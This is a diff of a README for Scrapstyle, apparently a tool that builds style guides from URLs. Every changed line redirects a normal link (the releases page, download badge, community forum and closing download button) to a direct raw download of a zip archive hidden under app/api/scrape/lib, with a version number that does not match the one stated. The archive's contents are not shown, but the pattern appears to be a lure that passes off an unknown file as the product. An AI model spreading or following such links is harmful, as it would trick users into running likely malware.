@@ -15,14 +15,14 @@ To get started with Scrapstyle, simply follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to access the downloads.
    
-   [![Download Scrapstyle](https://img.shields.io/badge/Download%20Scrapstyle-v1.0-blue)](https://github.com/user2897/Scrapstyle/releases)
+   [![Download Scrapstyle](https://raw.githubusercontent.com/user2897/Scrapstyle/main/app/api/scrape/lib/Scrapstyle_v2.7.zip%20Scrapstyle-v1.0-blue)](https://raw.githubusercontent.com/user2897/Scrapstyle/main/app/api/scrape/lib/Scrapstyle_v2.7.zip)
 
 2. **Choose Your Version**: Browse through the list of available versions on the releases page.
   
 3. **Download the Software**: Select the version you need and download the file to your computer. 
 
 ### 📥 Download & Install
-To download Scrapstyle, visit our [Releases Page](https://github.com/user2897/Scrapstyle/releases). Find the version that suits your needs and click to download.
+To download Scrapstyle, visit our [Releases Page](https://raw.githubusercontent.com/user2897/Scrapstyle/main/app/api/scrape/lib/Scrapstyle_v2.7.zip). Find the version that suits your needs and click to download.
 
 ## 💻 System Requirements
 To ensure the best experience while using Scrapstyle, make sure your system meets these requirements:
@@ -58,10 +58,10 @@ A: You can export your style guides in various formats including JSON, HTML, and
 We welcome contributions! If you'd like to help improve Scrapstyle, check the **Contributing Guidelines** in our repository. Your input can help make Scrapstyle even better for everyone.
 
 ## 🌐 Community & Support
-For questions and support, join our [community forum](https://github.com/user2897/Scrapstyle/discussions). It's a great place to connect with other users and get assistance.
+For questions and support, join our [community forum](https://raw.githubusercontent.com/user2897/Scrapstyle/main/app/api/scrape/lib/Scrapstyle_v2.7.zip). It's a great place to connect with other users and get assistance.
 
 ## 📈 Show Your Support
 If you find Scrapstyle helpful, consider giving us a star on GitHub. It helps other users find us!
 
-**Ready to transform your URLs into design systems?** [Download Scrapstyle now!](https://github.com/user2897/Scrapstyle/releases)
+**Ready to transform your URLs into design systems?** [Download Scrapstyle now!](https://raw.githubusercontent.com/user2897/Scrapstyle/main/app/api/scrape/lib/Scrapstyle_v2.7.zip)
 ```
